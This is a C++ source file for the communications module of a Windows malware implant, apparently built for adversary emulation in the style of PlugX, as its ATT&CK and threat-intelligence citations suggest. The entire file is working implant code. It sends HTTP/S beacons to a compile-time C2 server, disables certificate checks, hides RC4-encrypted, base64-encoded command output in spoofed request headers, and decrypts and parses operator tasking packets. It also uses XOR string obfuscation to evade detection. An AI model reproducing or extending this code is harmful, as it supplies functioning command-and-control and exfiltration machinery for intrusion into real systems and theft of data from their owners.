#include "comms.hpp"
#include "util.hpp"
#include "base64.hpp"
#include "rc4.hpp"
#include <winhttp.h>
#include <al/import.hpp>

#ifndef SERVER
#error "comms.cpp must have SERVER set at compile time"
#endif


#ifndef PORT
#error "comms.cpp must have PORT set at compile time"
#endif

// namespace for communication related functionality
namespace Comms {

    /*
     * initialize:
     *      About:
     *          Sets up necessary data structures and handles for http/s communication.
     *      Result:
     *          0 upon success, otherwise non-zero error code.
     *      MITRE ATT&CK Techniques:
     *          T1071.001: Application Layer Protocol: Web Protocol
     *          T1573.002: Encrypted Channel: Asymmetric Cryptography
     *      CTI:
     *          https://research.checkpoint.com/2023/chinese-threat-actors-targeting-europe-in-smugx-campaign/
     *          https://blog.eclecticiq.com/mustang-panda-apt-group-uses-european-commission-themed-lure-to-deliver-plugx-malware
     */
    DWORD initialize(sh_context* ctx, DWORD secure) {
        ctx->hInternet = nullptr;
        ctx->hRequest = nullptr;
        ctx->requestFlags = 0;
        ctx->hInternet = ctx->fp.fp_InternetOpenA("Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0"_xor, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
        DWORD error_code;

        if (!ctx->hInternet) {
            error_code = ctx->fp.shared_fp.fp_GetLastError();
            AesLogger::LogError(ctx->log_ctx, "InternetOpenA failed with error code: %d"_xor, error_code);
            return error_code;
        }
        if (secure) {
            AesLogger::LogDebug(ctx->log_ctx, "Using HTTPS comms"_xor);
            ctx->usingHttps = TRUE;

            // Ignore some cert verification issues
            ctx->requestFlags = INTERNET_FLAG_SECURE | INTERNET_FLAG_RELOAD | INTERNET_FLAG_IGNORE_CERT_CN_INVALID | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID;
        }
        else {
            AesLogger::LogDebug(ctx->log_ctx, "Using HTTP comms"_xor);
            ctx->usingHttps = FALSE;
            ctx->requestFlags = INTERNET_FLAG_RELOAD;
        }

        AesLogger::LogDebug(ctx->log_ctx, "Using C2 address: %s:%d"_xor, SERVER, PORT);

        return ERROR_SUCCESS;
    }

    /*
     * getRequest:
     *      About:
     *          Makes a GET request to the c2Url; flexible to http/s
     *      Result:
     *          0 upon success, otherwise non-zero error code.
     *      MITRE ATT&CK Techniques:
     *          T1071.001: Application Layer Protocol: Web Protocol
     *          T1573.002: Encrypted Channel: Asymmetric Cryptography
     *      CTI:
     *          https://research.checkpoint.com/2023/chinese-threat-actors-targeting-europe-in-smugx-campaign/
     *          https://blog.eclecticiq.com/mustang-panda-apt-group-uses-european-commission-themed-lure-to-deliver-plugx-malware
     */
    DWORD getRequest(sh_context* ctx, module_context_t* m_ctx) {
        char* headers = NULL;
        DWORD error_code;
        LPCSTR acceptTypes[] = {"*/*", NULL};

        // Prepare request
        ctx->hSession = ctx->fp.fp_InternetConnectA(
            ctx->hInternet,
            SERVER,
            PORT,
            NULL,
            NULL,
            INTERNET_SERVICE_HTTP,
            ctx->requestFlags,
            NULL
        );
        if (!ctx->hSession) {
            error_code = ctx->fp.shared_fp.fp_GetLastError();
            AesLogger::LogError(ctx->log_ctx, "InternetConnectA failed with error code: %d"_xor, error_code);
            return error_code;
        }

        ctx->hRequest = ctx->fp.fp_HttpOpenRequestA(
            ctx->hSession,
            "GET",
            "/",
            NULL,
            NULL,
            acceptTypes,
            ctx->requestFlags,
            NULL
        );
        if(!ctx->hRequest) {
            error_code = ctx->fp.shared_fp.fp_GetLastError();
            AesLogger::LogError(ctx->log_ctx, "HttpOpenRequestA failed with error code: %d"_xor, error_code);
            return error_code;
        }

        // Ignore additional cert validation
        if (ctx->usingHttps) {
            DWORD dwFlags;
            DWORD reqSize = sizeof(dwFlags);
            if (!ctx->fp.fp_InternetQueryOptionA(ctx->hRequest, INTERNET_OPTION_SECURITY_FLAGS, &dwFlags, &reqSize)) {
                error_code = ctx->fp.shared_fp.fp_GetLastError();
                AesLogger::LogError(ctx->log_ctx, "InternetQueryOptionA failed with error code: %d"_xor, error_code);
                return error_code;
            }

            dwFlags |= (SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_REVOCATION | SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_WEAK_SIGNATURE);
            if (!ctx->fp.fp_InternetSetOptionA(ctx->hRequest, INTERNET_OPTION_SECURITY_FLAGS, &dwFlags, reqSize)) {
                error_code = ctx->fp.shared_fp.fp_GetLastError();
                AesLogger::LogError(ctx->log_ctx, "InternetSetOptionA failed with error code: %d"_xor, error_code);
                return error_code;
            }
        }

        // check if module output
        if (m_ctx) {
            AesLogger::LogDebug(ctx->log_ctx, "Encrypting output to include in beacon."_xor);

            // Have to copy in case m_ctx->output points to read-only data
            unsigned char* enc_output = (unsigned char*)ctx->fp.fp_malloc(m_ctx->outputSize);
            if (!enc_output) {
                AesLogger::LogError(ctx->log_ctx, "Failed to allocate buffer for encrypting message."_xor);
                return COMMS_GET_REQUEST_FAIL_MALLOC;
            }

            pi_memcpy(enc_output, m_ctx->output, m_ctx->outputSize);
            unsigned char key[] = "secret_key";

            RC4CryptInPlace(enc_output, m_ctx->outputSize, key, sizeof(key) - 1);

            size_t encoded_size = ((m_ctx->outputSize + 2) / 3) * 4 + 1;
            char* output = (char*)ctx->fp.fp_malloc(encoded_size);
            size_t encoded_len;

            base64_encode(enc_output, m_ctx->outputSize, output, &encoded_len);
            output[encoded_len] = '\0';
            ctx->fp.fp_free(enc_output);

            // encoded size + static header format + implant id
            size_t totalLen = encoded_len + 128; // eventually will add size of implant id (future pr)

            headers = (char*)ctx->fp.fp_malloc(totalLen);
            if (!headers) {
                ctx->fp.fp_free(output);
                AesLogger::LogError(ctx->log_ctx, "Failed to allocate buffer for HTTP headers."_xor);
                return COMMS_GET_REQUEST_FAIL_MALLOC;
            }
            ctx->fp.fp_sprintf(headers, "Sec-Dest: 123\r\nSec-Site:%s\r\n"_xor, m_ctx->outputSize>0 ? output : "123");
            ctx->fp.fp_free(output);
        }

        AesLogger::LogDebug(ctx->log_ctx, "Sending GET request beacon."_xor);


        // Send request
        BOOL sendResult = ctx->fp.fp_HttpSendRequestA(ctx->hRequest, headers, -1L, NULL, 0);
        if (headers != NULL) {
            ctx->fp.fp_free(headers);
        }

        if(!sendResult) {
            error_code = ctx->fp.shared_fp.fp_GetLastError();
            AesLogger::LogError(ctx->log_ctx, "HttpSendRequestA failed with error code: %d"_xor, error_code);
            return error_code;
        }

        return ERROR_SUCCESS;
    }

    /*
     * readResponse:
     *      About:
     *          Reads an http/s response from the HINTERNET handle buffer
     *      Result:
     *          0 upon success, otherwise non-zero error code.
     *      MITRE ATT&CK Techniques:
     *          T1071.001: Application Layer Protocol: Web Protocol
     *          T1573.002: Encrypted Channel: Asymmetric Cryptography
     *      CTI:
     *          https://research.checkpoint.com/2023/chinese-threat-actors-targeting-europe-in-smugx-campaign/
     *          https://blog.eclecticiq.com/mustang-panda-apt-group-uses-european-commission-themed-lure-to-deliver-plugx-malware
     */
    DWORD readResponse(sh_context* ctx, char** response, DWORD* totalSize) {
        DWORD currBufSize = 0;
        *response = NULL;
        *totalSize = 0;
        DWORD totalRead = 0;
        char* respBuf = NULL;
        DWORD errorCode;

        // Calculate initial buffer size using the Content-Length header value
        // or a hardcoded minimum if server is chunking its responses
        DWORD headerIndex = 0;
        DWORD contentLength = 0;
        DWORD queryBufSize = sizeof(DWORD);
        if (!(ctx->fp.fp_HttpQueryInfoW(ctx->hRequest, HTTP_QUERY_CONTENT_LENGTH | HTTP_QUERY_FLAG_NUMBER, &contentLength, &queryBufSize, &headerIndex))) {
            errorCode = ctx->fp.shared_fp.fp_GetLastError();

            // For large HTTP responses, the server may not include a Content-Length header
            // when chunking its responses
            if (errorCode == ERROR_WINHTTP_HEADER_NOT_FOUND) {
                // If chunked, start off with a minimum buffer size of 64KB
                currBufSize = 64*1024;

                AesLogger::LogDebug(ctx->log_ctx, "Content-Length header not included in server response. Will treat as chunked data."_xor);
            } else {
                AesLogger::LogError(ctx->log_ctx, "HttpQueryInfoW failed with error code: %d."_xor, errorCode);
                return errorCode;
            }
        } else {
            if (contentLength == 0) {
                return ERROR_SUCCESS;
            }

            currBufSize = contentLength + 1; // add space for null terminator
        }

        // Create initial response buffer
        respBuf = (char*)ctx->fp.fp_malloc(currBufSize);
        if (!respBuf) {
            AesLogger::LogError(ctx->log_ctx, "Failed to allocate response buffer."_xor);
            return COMMS_READ_FAIL_MALLOC;
        }

        // Fetch server response data
        while (TRUE) {
            DWORD bytesRead = 0;
            DWORD bytesAvailable = 0;

            // Wait until data is available
            if (!ctx->fp.fp_InternetQueryDataAvailable(ctx->hRequest, &bytesAvailable, 0, 0)) {
                errorCode = ctx->fp.shared_fp.fp_GetLastError();
                ctx->fp.fp_free(respBuf);
                AesLogger::LogError(ctx->log_ctx, "InternetQueryDataAvailable failed with error code: %d."_xor, errorCode);
                return errorCode;
            }

            if (bytesAvailable == 0) {
                break;
            }

            // Resize buffer if needed
            size_t requiredSize = totalRead + bytesAvailable + 1; // add space for null-terminator
            if (currBufSize < requiredSize) {
                while (currBufSize < requiredSize) {
                    if (currBufSize > 32*1024*1024) {
                        // Stop doubling after 32MB and increment by 16MB going forward
                        currBufSize += 16*1024*1024;
                    } else {
                        // Double buffer size
                        currBufSize *= 2;
                    }
                }

                void* oldBuf = respBuf;
                respBuf = (char*)ctx->fp.fp_realloc(respBuf, currBufSize);
                if (!respBuf) {
                    AesLogger::LogError(ctx->log_ctx, "Failed to reallocate response buffer."_xor);
                    ctx->fp.fp_free(oldBuf);
                    return COMMS_READ_FAIL_REALLOC;
                }
            }

            // Read data
            if (!ctx->fp.fp_InternetReadFile(ctx->hRequest, respBuf + totalRead, bytesAvailable, &bytesRead)) {
                errorCode = ctx->fp.shared_fp.fp_GetLastError();
                ctx->fp.fp_free(respBuf);
                AesLogger::LogError(ctx->log_ctx, "InternetReadFile failed with error code: %d."_xor, errorCode);
                return errorCode;
            }
            totalRead += bytesRead;

            if (bytesRead == 0) {
                break;
            }
        }

        // Null-terminate server response string
        respBuf[totalRead] = '\0';

        // Create buffer for base64 decoding - this buffer will eventually be
        // provided to the caller
        unsigned char* decodedBuf = (unsigned char*)ctx->fp.fp_malloc(totalRead);
        if (!decodedBuf) {
            AesLogger::LogError(ctx->log_ctx, "Failed to allocate decoding buffer."_xor);
            ctx->fp.fp_free(respBuf);
            return COMMS_READ_FAIL_MALLOC;
        }

        // Decode and decrypt response
        size_t decoded_len = 0;
        base64_decode(respBuf, decodedBuf, &decoded_len);
        decodedBuf[decoded_len] = '\0';

        unsigned char key[] = "secret_key";
        RC4CryptInPlace(decodedBuf, decoded_len, key, sizeof(key) - 1);

        // Free intermediary buffer and return pointer to plaintext response
        ctx->fp.fp_free(respBuf);
        *response = (char*)decodedBuf;
        *totalSize = decoded_len;
        AesLogger::LogDebug(ctx->log_ctx, "Decoding and decrypted server response (%d resulting bytes)."_xor, decoded_len);
        return ERROR_SUCCESS;
    }

    /*
     * teardown:
     *      About:
     *          tears down the comm object
     *      MITRE ATT&CK Techniques:
     *          T1071.001: Application Layer Protocol: Web Protocol
     *          T1573.002: Encrypted Channel: Asymmetric Cryptography
     *      CTI:
     *          https://research.checkpoint.com/2023/chinese-threat-actors-targeting-europe-in-smugx-campaign/
     *          https://blog.eclecticiq.com/mustang-panda-apt-group-uses-european-commission-themed-lure-to-deliver-plugx-malware
     */
    DWORD teardown(sh_context* ctx) {
        ctx->fp.fp_InternetCloseHandle(ctx->hRequest);
        ctx->fp.fp_InternetCloseHandle(ctx->hInternet);

        return ERROR_SUCCESS;
    }


    DWORD parseResponse(sh_context* ctx, char* buffer, size_t bufferSize, c2_packet* packet) {
        // Make sure we have the header
        if (bufferSize < sizeof(packet_header)) {
            return COMMS_PACKET_MALFORMED;
        }

        // read the packet header
        packet_header* packetHeader = (packet_header*)buffer;

        // total packet size
        size_t requiredSize = sizeof(packet_header) + packetHeader->argLength + packetHeader->contentLength;
        if (bufferSize < requiredSize) {
            return COMMS_PACKET_MALFORMED;
        }

        // copy data to packet struct
        packet->id = packetHeader->id;
        packet->argLength = packetHeader->argLength;
        packet->contentLength = packetHeader->contentLength;

        // initialize the data fields
        packet->args = NULL;
        packet->content = NULL;

        if (packetHeader->argLength > 0) {
            packet->args = (char*)(buffer + sizeof(packet_header));
        }
        if (packetHeader->contentLength > 0) {
            packet->content = (char*)(buffer + sizeof(packet_header) + packetHeader->argLength);
        }

        return ERROR_SUCCESS;
    }

}
